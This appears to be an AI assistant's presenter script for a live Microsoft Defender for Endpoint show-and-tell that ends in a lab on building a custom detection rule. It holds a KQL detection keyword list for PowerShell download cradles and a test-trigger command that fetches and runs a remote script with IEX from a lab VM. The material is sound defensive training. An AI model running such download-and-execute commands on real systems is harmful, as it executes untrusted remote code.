Excellent — you got it. Below is your **complete, presenter-ready walkthrough** — written exactly as you’ll follow it live.
It combines your **deck-based show & tell**, the **Incidents view screenshot you shared**, your **device overview baseline**, and the **custom detection rule lab** into one detailed script.
It’s formatted in the GitHub style you use for your speaking repo — so you can drop it straight into
`Cyberlorians/Speaking/EDR-ShowAndTell.md`.

---

# 🎥 Microsoft Defender for Endpoint — Show & Tell (50-Minute Live Session)

---

## 🎯 Session Goal

Demonstrate the *end-to-end analyst workflow* in Microsoft 365 Defender for Endpoint — from data collection → incident correlation → investigation → response → custom detection.

> You’ve already shown the slides — this session is **fully live** (portal-based storytelling).

---

## 🕒 Timeline Overview

| Segment | Duration     | Focus                                         |
| ------- | ------------ | --------------------------------------------- |
| 1       | 5 min        | Device Overview (EDR context)                 |
| 2       | 10 min       | Incidents Queue — XDR correlation             |
| 3       | 10 min       | Incident Deep Dive — Investigation path       |
| 4       | 15 min       | Response Actions — containment, Live Response |
| 5       | 10 min       | Hands-On Lab — Custom Detection Rule          |
| —       | 50 min total |                                               |

---

## 🔹 Segment 1 — Device Overview & Onboarding Context (≈5 min)

**Objective:** Establish what EDR “sees” before we ever have alerts.

**Do this live:**

1. Open **Microsoft 365 Defender → Devices → pick two examples**:

   * One **workgroup** (non-Entra joined)
   * One **Entra-joined (EIDJ)** device
2. Open the **Overview** tab on each.

**Say while showing:**

> “Every onboarded endpoint feeds continuous telemetry — process starts, network connects, file writes.
> Notice how the Entra-joined device carries richer identity and compliance context.
> That identity linkage becomes important when incidents are correlated later.”

**Highlight visually:**

* Device tags
* Risk level
* Onboarding status
* Defender version / Last seen

**Transition line:**

> “Now let’s move from a single device’s telemetry to how Defender automatically correlates that data into incidents.”

---

## 🔹 Segment 2 — Incidents Queue — The Analyst Starting Line (≈10 min)

**Objective:** Show how signals from multiple Defender products combine into one incident.

**Do this live:**

1. Navigate to **Investigation & Response → Incidents & Alerts → Incidents**.
2. You should see your screen like the one below 👇 (the screenshot you captured):

   *(Describe it if not displaying the image directly — you’ll be live in the portal anyway.)*

   * Columns: **Incident name, Severity, Investigation state, Categories, Impacted assets, Service source, Detection source, Product names.**

**Say while scrolling:**

> “This is where analysts live day-to-day.
> Each line represents one or more correlated alerts — across Defender for Endpoint, Identity, Office, and even Sentinel.
> This is Microsoft’s XDR in action.”

**Live steps:**

* Filter → `Service source = Endpoint`.
* Highlight the **‘Multi-stage incident involving Persistence & Defense evasion’** example.
* Open it.

**Say:**

> “This one combines multiple alerts — persistence attempts, defense evasion, and lateral movement — all grouped automatically.
> Let’s look at how that correlation plays out visually.”

---

## 🔹 Segment 3 — Investigate the Incident (≈10 min)

**Objective:** Show the investigation workflow — attack story, related alerts, and entity pivots.

**Do this live:**

1. From your open incident:

   * Click **Attack story** → walk the audience through each node.
     *“Recon → Execution → Persistence — that’s the chain.”*
   * Click **Related alerts** → point out different Detection Sources.
   * Click **Entities → select the Device** (to jump into the device page).
2. Once on the **Device**:

   * Show the **Timeline** tab (if present) or **Alerts** tab.
   * Filter to recent activity or PowerShell executions.

**Say:**

> “From one view, I can pivot from alert → file → process → device.
> Everything is correlated and time-sequenced — that’s why we call it endpoint *detection and response*, not just antivirus.”

**Optional tip:**
If Timeline doesn’t appear, call that out and show the Overview or Alerts list instead.

**Transition line:**

> “Let’s respond to what we found.”

---

## 🔹 Segment 4 — Response Actions (≈15 min)

**Objective:** Demonstrate containment, evidence collection, and analyst tooling.

**Do this live:**

1. From the **Device page**, show the top action bar:

   * 🧩 **Run antivirus scan**
   * 📦 **Collect investigation package**
   * 🔒 **Isolate device** *(hover only — don’t confirm)*
   * 💻 **Initiate Live Response**

**Say:**

> “These are the tools analysts use to contain threats remotely — no RDP, no manual touch.”

2. **Open a Live Response session** (safe demo):

   * Click *Initiate Live Response*.
   * Once connected, run:

     ```powershell
     dir C:\Users
     tasklist
     ```
   * Show the command output in the console.

**Say:**

> “Live Response gives me a secure, audited shell into the endpoint.
> I can run scripts, collect samples, or remediate directly from here.”

3. **Show File-Level actions:**

   * Back to the incident → open a **File entity**.
   * Highlight:

     * *Stop and Quarantine*
     * *Add Indicator*
     * *Download File*
   * Explain that all actions flow through **Action Center** for tracking and rollback.

**Transition line:**

> “Now that we’ve contained and investigated, let’s build our own detection.”

---

## 🔹 Segment 5 — Hands-On Lab: Custom Detection Rule (≈10 min)

**Objective:** Teach the team how to create their own automated detection using the GitHub lab.

**Reference:** [Remote-Code-Execution-Detection-via-MDE](https://github.com/0xAll3nC/Remote-Code-Execution-Detection-via-MDE/blob/main/2_custom_detection_rule.md)

---

### 🧩 Step 1 — Explain the Goal

Say:

> “We’re going to detect remote PowerShell abuse — the same technique we saw in the attack story.”

---

### 🧩 Step 2 — Build the Query

1. Go to **Hunting → Advanced Hunting**.
2. Paste this query:

   ```kql
   DeviceProcessEvents
   | where ProcessCommandLine has_any ("Invoke-Expression", "IEX", "WebClient", "DownloadString")
   | extend Account = tostring(InitiatingProcessAccountName)
   | project Timestamp, DeviceName, FileName, ProcessCommandLine, Account
   ```
3. Run once to show results or empty output.

Say:

> “We’re looking for PowerShell patterns often seen in remote code execution.”

---

### 🧩 Step 3 — Create the Detection Rule

1. Click **New detection rule → Create from query.**
2. Name: `Remote Code Execution – PowerShell Abuse`.
3. Frequency: every **1 hour**.
4. Lookback: **1 hour**.
5. Severity: **High**.
6. Category: **Execution → Command and Control**.
7. Assign to yourself (or SOC group).
8. Save.

Say:

> “Now this query becomes a rule — Defender will continuously watch for it and generate alerts automatically.”

---

### 🧩 Step 4 — Optional Test Trigger

From a **lab VM**, run:

```powershell
powershell -c "IEX ((New-Object Net.WebClient).DownloadString('http://example.com/test.ps1'))"
```

Wait 1–2 minutes → return to **Incidents**.
Show the new **Custom Detection** alert.

Say:

> “Our rule worked — Defender saw the behavior and created an incident just like any built-in detection.”

---

### 🧩 Step 5 — Close the Loop

Go back to **Incidents → open the new custom detection**.
Point out:

* Detection source = *Custom detection rule*
* Product name = *Microsoft 365 Defender*

Say:

> “Now we’ve gone full-circle: telemetry → incident → investigation → response → custom detection.”

---

## 🔹 Wrap-Up (≈2 min)

**Say while showing the incident summary:**

> “This is the full lifecycle of EDR — continuous telemetry, AI-driven correlation, manual and automated response, and extensibility through custom rules.”

**Optional final demo:**
Open **Advanced Hunting → DeviceFileEvents** and show:

```kql
DeviceFileEvents | where Timestamp >= ago(7d) | take 5
```

Say:

> “This is our data foundation — 6 months of raw telemetry ready for retrospective hunts.”

---

## ✅ Pre-Session Checklist

| Item             | Description                                                                                            |
| ---------------- | ------------------------------------------------------------------------------------------------------ |
| 🎓 Lab Tenant    | Ensure 1–2 recent incidents exist (use simulated or real low-risk alerts).                             |
| 🧩 Permissions   | Your demo account must have *Security Operations* role.                                                |
| 💻 Device Access | Confirm one onboarded VM for live response actions.                                                    |
| 🚫 Safe Mode     | Don’t actually isolate or quarantine production devices — just show buttons.                           |
| 🧠 Backup        | Have screenshots of key views in case latency hits (Attack story, Process tree, Live response window). |

---

## 🧭 Optional Closing Line

> “Everything you’ve seen today — from telemetry to automated response — exists in your tenant right now.
> The more you hunt, tune, and tag, the smarter your EDR becomes.”

---

Would you like me to finalize this as a properly formatted `.md` file (ready for your `Speaking` GitHub repo with code fences, emoji headers, and section anchors)? It’ll be drop-in ready for your next session.
